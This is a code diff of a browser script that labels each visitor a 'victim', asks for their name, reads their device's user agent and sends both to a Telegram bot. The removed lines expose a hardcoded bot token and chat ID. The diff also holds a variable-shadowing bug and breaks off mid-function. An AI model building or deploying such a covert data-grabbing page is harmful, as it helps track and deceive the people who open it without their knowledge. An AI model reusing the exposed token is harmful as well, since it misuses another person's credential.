@@ -6,25 +6,54 @@ function log_msg(message, title) {
     }
 }
 
+async function load_data(path) {
+    try {
+        const res = await fetch(path);
+        const data = res.json();
+        return data
+    }catch (error) {
+        log_msg(error)
+    }
+}
 
-function load() {
+async function load() {
+    let victim_name = localStorage.getItem("victim_name")
+    if (!victim_name) {
+        let victim_name =  prompt("Your Name (required): ")
+        if (!victim_name) {
+            alert("Name wasn't given, please try again!")
+            window.location.reload()
+            return
+        }
+
+        localStorage.setItem("victim_name", victim_name)
+    }
+
     log_msg("[+] Please wait...", "Please wait...")
     log_msg("[+] Getting device info...")
 
-    var device_info = navigator.userAgent;
+    let device_info = navigator.userAgent;
 
     log_msg("[+] Information:")
     log_msg(device_info)
-    log_msg("[+] Sending information to `Bishal`")
 
-    var bot_token = "7877071626:AAECIFcZomfylNSR2dq1rDIuZkgU1nmJ_vk";
-    var chat_id = "2134776547";
-    var message = device_info
+    const data = await load_data("./assets/data.json")
+    bot_token = data.BOT_TOKEN
+    chat_id = data.CHAT_ID
+    
+    if (!bot_token || !chat_id) {
+        log_msg("Error: Required data are missing..", "Error occured!")
+        return
+    }
+    
+    log_msg("[+] Sending information...")
 
-    var url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=HTML&text=${message}`;
+    let message = `<b>${victim_name}:</b> <code>${device_info}</code>`
 
-    var req = new XMLHttpRequest();
-    req.open("GET", url, true);
+    let url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=HTML&text=${message}`;
+
+    let req = new XMLHttpRequest();
+    req.open("POST", url, true);
     req.send();
     req.onload = function() {
         if (req.status == 200) {
